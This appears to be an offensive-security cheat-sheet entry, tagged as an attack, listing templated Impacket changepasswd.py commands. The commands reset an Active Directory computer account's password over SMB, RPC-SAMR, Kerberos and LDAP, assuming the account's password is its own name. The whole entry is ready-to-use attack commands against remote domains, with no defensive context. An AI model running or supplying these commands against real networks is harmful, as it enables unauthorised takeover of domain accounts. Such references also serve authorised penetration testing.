# changepasswd
#plateform/linux #target/remote #cat/ATTACK

## changepasswd with smb protocol (Default)
#plateform/linux #target/remote #cat/ATTACK
```
changepasswd.py <domain>/<computer_name>\$:<computer_name>@<IP_ADDRESS> -newpass Passw0rd123! 
```

## changepasswd with rpc-samr protocol
#plateform/linux #target/remote #cat/ATTACK
```
changepasswd.py <domain>/<computer_name>\$:<computer_name>@<IP_ADDRESS> -newpass Passw0rd123! -protocol rpc-samr
```

## changepasswd with kerberos protocol
#plateform/linux #target/remote #cat/ATTACK
```
changepasswd.py <domain>/<computer_name>\$:<computer_name>@<IP_ADDRESS> -newpass Passw0rd123! -protocol kpasswd
```

## changepasswd with ldap protocol
#plateform/linux #target/remote #cat/ATTACK
```
changepasswd.py <domain>/<computer_name>\$:<computer_name>@<IP_ADDRESS> -newpass Passw0rd123! -protocol ldap
```

